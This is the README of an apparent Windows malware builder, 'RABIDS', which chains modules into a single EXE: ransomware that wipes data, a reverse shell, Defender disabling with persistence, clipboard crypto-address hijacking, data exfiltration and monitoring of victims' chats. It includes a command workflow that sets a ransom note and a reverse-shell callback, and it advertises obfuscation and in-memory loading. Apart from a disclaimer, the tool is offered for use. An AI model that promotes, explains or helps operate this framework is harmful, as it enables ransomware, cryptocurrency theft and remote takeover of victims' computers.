## What's New

### VERSION 0.1.3
- **New Module: `daemon/gremlin`** - Clipboard wallet address hijacker
- **Features:**
  - Monitors clipboard for copied wallet addresses (Bitcoin, Ethereum, BEP-20, Solana)
  - Automatically replaces detected wallet addresses with user-configurable predefined addresses
  - Predefined addresses for each chain can be set using the `set` command before build
  
---

## Overview
**RABIDS** Roving Autonomous Bartmoss Interface Drones is a modular Windows malware generation framework. It empowers security researchers and red teamers to rapidly build custom malware payloads by chaining together a variety of modules—such as ransomware, persistence loaders, C2 servers, and more—into a single executable. RABIDS is designed for advanced adversary simulation, malware research, and authorized red team operations.

> **Warning:** This tool is for educational and authorized security research only. Misuse may be illegal and unethical.

---

## Features

- **Modular Payloads:** Chain multiple modules (ransomware, persistence, C2, etc.) into a single EXE.
- **Customizable Options:** Configure module and build options (e.g., ransom note, C2 port, EXE name).
- `use <module>` — Add a module to the build chain
- `set <OPTION> <VALUE>` — Set build/module options
- `show modules` — List available modules
- `show options` — Show current build/module options
- `build` — Build the final EXE payload
- `clear` — Clear selected modules
- `delete` — Remove a module from the chain
- `exit` — Exit the tool

**For detailed documentation on each command and advanced usage, see the [RABIDS Wiki](https://github.com/sarwaaaar/RABIDS/wiki).**

### Example Workflow
```
> show modules
> use daemon/krash
> set NOTE "Your files have been encrypted! Contact evil@domain.com."
> use daemon/flatline
> set LHOST 192.168.1.10
> set LPORT 4444
> build
```
- The final EXE will be saved in the `.LOOT` directory.

---

## Available Daemon Modules

- **roadrunner**: Scans and exfiltrates system and network info
- **hellhound**: Gains persistence and disables Defender protections
- **gremlin**: Hijacks clipboard crypto addresses
- **blackice**: Blacks out the screen to disrupt user activity
- **logicbomb**: Blocks input and triggers DoS on the target
- **flatline**: Provides a reverse shell for remote access
- **krash**: Wipes data and crashes the system using ransomware
- **ghost**: Hides presence and evades detection
- **razorwire**: Implements defensive countermeasures
- **overwatch**: Monitors all victims chats

## Module Options

- **roadrunner**
    - `TARGET_IP`: Target IP address (default: 127.0.0.1)
    - `TARGET_PORT`: Target port (default: 9000)
- **hellhound**
    - `PERSISTENCE`: Enable persistence (default: true)
    - `DEFENDER_EXCLUDE`: Add Defender exclusion (default: true)
- **gremlin**
    - `BTC_ADDRESS`: Bitcoin address
    - `ETH_ADDRESS`: Ethereum address
    - `BEP20_ADDRESS`: BEP-20 address
    - `SOL_ADDRESS`: Solana address
- **blackice**
    - `DURATION`: Duration of blackout in seconds (default: 60)
- **logicbomb**
    - `BLOCK_INPUT`: Block input (default: true)
    - `TRIGGER_DELAY`: Delay before trigger in seconds (default: 10)
- **flatline**
    - `LHOST`: Local host for reverse connection (default: 0.0.0.0)
    - `LPORT`: Local port (default: 4444)
    - `KEY`: Encryption key (default: changeme)
- **krash**
    - `NOTE`: Ransom note text

---

## Advanced Features
- **Module Chaining:** Combine multiple behaviors in one payload.
- **Custom Build Options:** Set EXE name, enable obfuscation, etc.
- **In-Memory Execution:** Use Rust loader for stealthy delivery.

---

## Legal Disclaimer

RABIDS is intended for educational purposes and authorized security testing only. You must have explicit permission to use this tool against any system or network. The authors and contributors are not responsible for misuse, damage, or legal consequences. Always follow applicable laws and ethical guidelines.

---

## Contributing

Contributions are welcome! Please fork the repository, create a feature branch, and submit a pull request with a detailed description of your changes.

---

## License

MIT License. See the `LICENSE` file for details.
